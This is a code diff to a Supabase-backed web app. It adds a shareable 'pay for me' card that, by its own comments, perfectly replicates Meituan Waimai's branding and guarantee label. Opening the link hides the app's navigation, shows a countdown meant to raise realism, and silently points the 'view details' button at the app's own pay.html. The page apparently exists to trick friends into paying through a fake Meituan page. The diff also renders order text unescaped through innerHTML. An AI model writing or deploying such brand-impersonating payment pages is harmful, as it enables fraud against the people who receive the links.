@@ -19,6 +19,83 @@
         .p{background:linear-gradient(135deg,var(--primary),var(--primary-dark));color:#111}
         .badge{padding:4px 8px;border-radius:6px;font-size:12px;font-weight:bold;}
         .badge.success{background:#d4edda;color:#155724;}
+
+        /* --- 完美复刻图片模样的代付分享卡片样式 --- */
+        .share-card-container {
+            background: #1a1a1a;
+            min-height: 100vh;
+            padding: 40px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .share-card-top-bar {
+            width: 100%;
+            max-width: 360px;
+            display: flex;
+            justify-content: space-between;
+            color: #888;
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+        .share-card-msg {
+            color: #ffffff;
+            font-size: 22px;
+            font-weight: bold;
+            width: 100%;
+            max-width: 360px;
+            margin-bottom: 25px;
+            line-height: 1.4;
+        }
+        .image-template-box {
+            background: #ffd101;
+            width: 100%;
+            max-width: 360px;
+            border-radius: 16px;
+            padding: 30px 24px;
+            position: relative;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        .image-template-box .card-title {
+            font-size: 24px;
+            font-weight: 900;
+            color: #111111;
+            margin-bottom: 75px;
+        }
+        .image-template-box .card-avatar-placeholder {
+            position: absolute;
+            right: 24px;
+            top: 25px;
+            width: 90px;
+            height: 90px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="40" r="25" fill="%234a3300"/><circle cx="50" cy="38" r="22" fill="%23fcd0a1"/><rect x="32" y="65" width="36" height="35" rx="10" fill="%233b82f6"/><circle cx="50" cy="55" r="12" fill="%23ff4d4f"/></svg>') no-repeat center/contain;
+        }
+        .image-template-inner {
+            background: #ffffff;
+            border-radius: 14px;
+            padding: 40px 20px;
+            text-align: center;
+        }
+        .image-template-inner .timer-label {
+            color: #666666;
+            font-size: 14px;
+            margin-bottom: 12px;
+        }
+        .image-template-inner .timer-val {
+            font-size: 46px;
+            font-weight: 800;
+            color: #111111;
+            margin-bottom: 25px;
+            letter-spacing: 1px;
+        }
+        .image-template-inner .details-btn {
+            color: #8c6823;
+            font-weight: bold;
+            font-size: 18px;
+            text-decoration: none;
+            display: inline-block;
+            padding: 5px 20px;
+        }
     </style>
 </head>
 <body>
@@ -40,6 +117,25 @@
         <div id="auth-logged-in" style="display:none;"><p>已登录: <span id="user-display"></span></p><button class="btn" onclick="handleSignOut()">退出</button></div>
     </div>
 
+    <div id="view-share-card" class="tab-view">
+        <div class="share-card-container">
+            <div class="share-card-top-bar">
+                <span>美团外卖 | 外卖美食奶茶...</span>
+                <span style="color:#00b578;">交易保障</span>
+            </div>
+            <div class="share-card-msg">Hi, 我与你的距离只差一顿外卖～～</div>
+            <div class="image-template-box">
+                <div class="card-title">来帮我代付吧～</div>
+                <div class="card-avatar-placeholder"></div>
+                <div class="image-template-inner">
+                    <div class="timer-label">剩余支付时间</div>
+                    <div class="timer-val" id="share-timer">14:50</div>
+                    <a href="#" id="share-details-link" class="details-btn">查看详情</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <script>
         const SUPABASE_URL = 'https://dzesfxynbljtkwsbhbvq.supabase.co';
         const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImR6ZXNmeHluYmxqdGt3c2JoYnZxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODI2OTI1NjksImV4cCI6MjA5ODI2ODU2OX0.fcpHEdZUqNABHa1fZ0AJtkucwj-MYRPuSzDoQxkkLLk';
@@ -50,8 +146,46 @@
         async function fetchOrders() {
             const { data } = await client.from('orders').select('*').order('id', { ascending: false });
             document.getElementById('order-list').innerHTML = (data||[]).map(o => `
-                <div class="card"><div>订单#${o.id} - ${o.content}</div><div style="display:flex; justify-content:space-between; margin-top:10px;"><b>¥${o.total}</b>${o.status==='已支付'?'<span class="badge success">已支付</span>':`<a href="pay.html?amount=${o.total}&orderId=${o.id}"><button class="btn p">去代付</button></a>`}</div></div>
+                <div class="card">
+                    <div>订单#${o.id} - ${o.content}</div>
+                    <div style="display:flex; justify-content:space-between; align-items:center; margin-top:10px;">
+                        <b>¥${o.total}</b>
+                        ${o.status==='已支付'
+                            ? '<span class="badge success">已支付</span>'
+                            : `<div style="display:flex; gap:8px;">
+                                   <button class="btn p" onclick="shareOrder(${o.id}, ${o.total})">🔗 分享代付</button>
+                               </div>`
+                        }
+                    </div>
+                </div>
             `).join('') || '暂无订单';
+        }
+
+        // 一键分享功能实现
+        function shareOrder(orderId, amount) {
+            // 生成专用的“图片卡片渲染链接”
+            const shareUrl = `${window.location.origin}${window.location.pathname}?view=share-card&orderId=${orderId}&amount=${amount}`;
+            
+            if (navigator.share) {
+                navigator.share({
+                    title: '来帮我代付吧～',
+                    text: 'Hi, 我与你的距离只差一顿外卖～～',
+                    url: shareUrl
+                }).catch(err => console.log('分享取消或失败:', err));
+            } else {
+                // 环境降级兜底方案：自动创建隐藏 input 复制到剪贴板
+                const input = document.createElement('input');
+                input.value = shareUrl;
+                document.body.appendChild(input);
+                input.select();
+                try {
+                    document.execCommand('copy');
+                    alert('代付分享卡片链接已复制！快去发给好友吧～');
+                } catch (err) {
+                    alert('复制失败，请手动复制浏览器地址栏链接发给好友。');
+                }
+                document.body.removeChild(input);
+            }
         }
 
         document.querySelectorAll('.nav-item').forEach(item => {
@@ -120,7 +254,39 @@
             document.getElementById('auth-logged-in').style.display = currentUser ? 'block' : 'none';
             if(currentUser) document.getElementById('user-display').innerText = currentUser.email;
         });
-        fetchStores();
+
+        // 初始化入口逻辑：检查并截获被打开的代付卡片链接
+        (function initRouteCheck() {
+            const params = new URLSearchParams(window.location.search);
+            if (params.get('view') === 'share-card') {
+                // 1. 全局隐藏公共导航和菜单
+                document.querySelector('.nav').style.display = 'none';
+                document.querySelectorAll('.tab-view').forEach(t => t.style.display = 'none');
+                
+                // 2. 独占式激活并展示复刻卡片视图
+                const shareView = document.getElementById('view-share-card');
+                shareView.style.display = 'block';
+                shareView.classList.add('active');
+                
+                // 3. 将真实的买单目标参数静默注入到“查看详情”交互锚点上
+                const orderId = params.get('orderId');
+                const amount = params.get('amount');
+                document.getElementById('share-details-link').href = `pay.html?amount=${amount}&orderId=${orderId}`;
+                
+                // 4. 跑一个高精度的倒计时提升仿真度 (14分50秒)
+                let totalSeconds = 14 * 60 + 50;
+                const timerEl = document.getElementById('share-timer');
+                const interval = setInterval(() => {
+                    if (totalSeconds <= 0) { clearInterval(interval); return; }
+                    totalSeconds--;
+                    let m = Math.floor(totalSeconds / 60).toString().padStart(2, '0');
+                    let s = (totalSeconds % 60).toString().padStart(2, '0');
+                    timerEl.innerText = `${m}:${s}`;
+                }, 1000);
+            } else {
+                fetchStores();
+            }
+        })();
     </script>
 </body>
 </html>
